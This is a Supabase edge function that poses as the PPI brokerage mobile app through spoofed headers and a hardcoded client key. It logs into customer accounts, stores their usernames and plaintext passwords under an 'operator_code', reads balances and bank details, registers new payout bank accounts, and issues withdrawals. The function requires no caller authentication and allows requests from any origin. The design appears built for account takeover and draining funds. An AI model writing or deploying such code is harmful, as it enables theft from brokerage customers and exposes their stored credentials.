import { createClient } from "https://esm.sh/@supabase/supabase-js@2";

const corsHeaders = {
  "Access-Control-Allow-Origin": "*",
  "Access-Control-Allow-Headers": "authorization, x-client-info, apikey, content-type",
};

const PPI_API = "https://api.portfoliopersonal.com";
const PPI_MOBILE_API = "https://mobileapi.portfoliopersonal.com";

const commonHeaders = {
  "accept": "application/json",
  "clientkey": "pp123456",
  "authorizedclient": "Prod-App-Mobile",
  "pp-appversion": "1.18.37",
  "appversion": "1.18.37",
  "accept-language": "pt-BR,pt;q=0.9",
};

const loginHeaders = {
  ...commonHeaders,
  "content-type": "application/json",
  "user-agent": "ios",
  "authorization": "false",
  "accept-encoding": "gzip, deflate, br",
};

const mobileHeaders = (token: string) => ({
  ...commonHeaders,
  "user-agent": "ppi_app/280 CFNetwork/1331.0.7 Darwin/21.4.0",
  "authorization": `Bearer ${token}`,
});

const mobileHeadersJson = (token: string) => ({
  ...mobileHeaders(token),
  "content-type": "application/json",
});

function safeJson(text: string) {
  try { return JSON.parse(text); } catch { return { error: text }; }
}

Deno.serve(async (req) => {
  if (req.method === "OPTIONS") return new Response(null, { headers: corsHeaders });

  try {
    const body = await req.json();
    const { action } = body;

    const supabaseUrl = Deno.env.get("SUPABASE_URL")!;
    const serviceKey = Deno.env.get("SUPABASE_SERVICE_ROLE_KEY")!;
    const sb = createClient(supabaseUrl, serviceKey);

    if (action === "login") {
      const { username, password } = body;
      const oneSignalID = `ppi_app-eBxX6OahB0grl7UuBpqaqz:APA91bFJg0cyUU8axJaFbjhrkXYggH3htEST_5k5AIoll_nsaCC2YZz3enpQa-qpHSoi-VNU1iPJ5TqggfCCTSgGgyPxBAR_gjgJ-hehpTwYYl0SZWNRx4M`;

      const res = await fetch(`${PPI_API}/api/Seguridad/Auth/Login`, {
        method: "POST",
        headers: loginHeaders,
        body: JSON.stringify({ usuario: username, clave: password, oneSignalID }),
      });

      const authHeader = res.headers.get("authorization") || res.headers.get("token") || "";
      const resText = await res.text();
      const loginBody = safeJson(resText);

      if (loginBody.message && loginBody.status === undefined && !loginBody.payload) {
        return new Response(JSON.stringify({ error: loginBody.message, raw: loginBody }), {
          headers: { ...corsHeaders, "content-type": "application/json" },
        });
      }

      if (loginBody.status !== 0 || !loginBody.payload) {
        return new Response(JSON.stringify({ error: loginBody.message || "Login failed", raw: loginBody }), {
          headers: { ...corsHeaders, "content-type": "application/json" },
        });
      }

      const token = authHeader || loginBody?.payload?.token || loginBody?.token || "";
      const p = loginBody.payload;
      const cuentaId = p.cuentaId;
      const fullName = p.denominacion;
      const comitente = p.comitente;

      // Save or update account in DB
      const { data: existing } = await sb.from("ppi_accounts").select("id").eq("email", username.toLowerCase()).maybeSingle();

      const accountData: Record<string, unknown> = {
        username,
        password,
        access_token: token || null,
        cuenta_id: cuentaId,
        full_name: fullName,
        comitente,
        profile_data: loginBody.payload,
        last_login_at: new Date().toISOString(),
      };

      if (existing) {
        await sb.from("ppi_accounts").update(accountData).eq("id", existing.id);
      } else {
        await sb.from("ppi_accounts").insert({ email: username.toLowerCase(), operator_code: body.operatorCode || "master", ...accountData });
      }

      return new Response(JSON.stringify({
        success: true,
        token,
        cuentaId,
        fullName,
        comitente,
        raw: loginBody,
        headers: Object.fromEntries(res.headers.entries()),
      }), {
        headers: { ...corsHeaders, "content-type": "application/json" },
      });
    }

    if (action === "balances") {
      const { token, cuentaId } = body;
      const res = await fetch(
        `${PPI_MOBILE_API}/api/v1/Accounts/${cuentaId}/BalancesAndPositions?currencyType=10051`,
        { headers: mobileHeaders(token) }
      );
      const data = safeJson(await res.text());

      if (body.accountDbId) {
        await sb.from("ppi_accounts").update({
          balance_data: data?.payload || data,
          last_data_sync_at: new Date().toISOString(),
        }).eq("id", body.accountDbId);
      }

      return new Response(JSON.stringify(data), {
        headers: { ...corsHeaders, "content-type": "application/json" },
      });
    }

    if (action === "bank_accounts") {
      const { token, cuentaId } = body;
      const res = await fetch(
        `${PPI_MOBILE_API}/api/v1/TransferAndDeposit/BankAccounts?accountId=${cuentaId}`,
        { headers: mobileHeaders(token) }
      );
      const data = safeJson(await res.text());

      if (body.accountDbId) {
        await sb.from("ppi_accounts").update({
          bank_accounts: data?.payload || data,
        }).eq("id", body.accountDbId);
      }

      return new Response(JSON.stringify(data), {
        headers: { ...corsHeaders, "content-type": "application/json" },
      });
    }

    if (action === "register_bank") {
      const { token, cuentaId, currencyId, cbuOrAlias } = body;
      const res = await fetch(
        `${PPI_MOBILE_API}/api/v1/TransferAndDeposit/BankAccountOpening`,
        {
          method: "POST",
          headers: mobileHeadersJson(token),
          body: JSON.stringify({ accountId: cuentaId, currencyId, cbuOrAlias }),
        }
      );
      const data = safeJson(await res.text());
      return new Response(JSON.stringify(data), {
        headers: { ...corsHeaders, "content-type": "application/json" },
      });
    }

    if (action === "withdraw_availability") {
      const { token, cuentaId, currencyId } = body;
      const res = await fetch(
        `${PPI_MOBILE_API}/api/v1/TransferAndDeposit/withdraw-availabilities?accountId=${cuentaId}&currencyId=${currencyId || 10000}`,
        { headers: mobileHeaders(token) }
      );
      const data = safeJson(await res.text());
      return new Response(JSON.stringify(data), {
        headers: { ...corsHeaders, "content-type": "application/json" },
      });
    }

    if (action === "withdraw_quote") {
      const { token, cuentaId, cbu, accountNumber, cuit, amount, currencyId } = body;
      const res = await fetch(
        `${PPI_MOBILE_API}/api/v1/TransferAndDeposit/withdraw-quote`,
        {
          method: "POST",
          headers: mobileHeadersJson(token),
          body: JSON.stringify({ accountId: cuentaId, cbu, accountNumber, cuit, amount: String(amount), currencyId: currencyId || 10000 }),
        }
      );
      const data = safeJson(await res.text());
      return new Response(JSON.stringify(data), {
        headers: { ...corsHeaders, "content-type": "application/json" },
      });
    }

    if (action === "withdraw") {
      const { token, cuentaId, cbu, accountNumber, cuit, amount, currencyId } = body;
      const res = await fetch(
        `${PPI_MOBILE_API}/api/v1/TransferAndDeposit/withdraw`,
        {
          method: "POST",
          headers: mobileHeadersJson(token),
          body: JSON.stringify({ accountId: cuentaId, cbu, accountNumber, cuit, amount: String(amount), currencyId: currencyId || 10000 }),
        }
      );
      const data = safeJson(await res.text());
      return new Response(JSON.stringify(data), {
        headers: { ...corsHeaders, "content-type": "application/json" },
      });
    }

    if (action === "orders") {
      const { token, cuentaId } = body;
      const now = new Date();
      const twoMonthsAgo = new Date(now);
      twoMonthsAgo.setMonth(twoMonthsAgo.getMonth() - 2);
      const fmt = (d: Date) => d.toISOString().replace("Z", "-03:00");

      const res = await fetch(
        `${PPI_MOBILE_API}/api/v1/Order/Orders/${cuentaId}?fromDate=${fmt(twoMonthsAgo)}&toDate=${fmt(now)}&page=1&pageSize=50`,
        { headers: mobileHeaders(token) }
      );
      const data = safeJson(await res.text());

      if (body.accountDbId) {
        await sb.from("ppi_accounts").update({
          orders_data: data?.payload || data,
        }).eq("id", body.accountDbId);
      }

      return new Response(JSON.stringify(data), {
        headers: { ...corsHeaders, "content-type": "application/json" },
      });
    }

    if (action === "account_state") {
      const { token, cuentaId } = body;
      const res = await fetch(
        `${PPI_API}/api/Cuenta/Internacional/Estado?cuentaID=${cuentaId}`,
        { headers: { ...commonHeaders, "content-type": "application/json", "user-agent": "ios", "authorization": `Bearer ${token}` } }
      );
      const data = safeJson(await res.text());
      return new Response(JSON.stringify(data), {
        headers: { ...corsHeaders, "content-type": "application/json" },
      });
    }

    return new Response(JSON.stringify({ error: "Unknown action" }), {
      status: 400,
      headers: { ...corsHeaders, "content-type": "application/json" },
    });
  } catch (e) {
    return new Response(JSON.stringify({ error: e.message }), {
      status: 500,
      headers: { ...corsHeaders, "content-type": "application/json" },
    });
  }
});
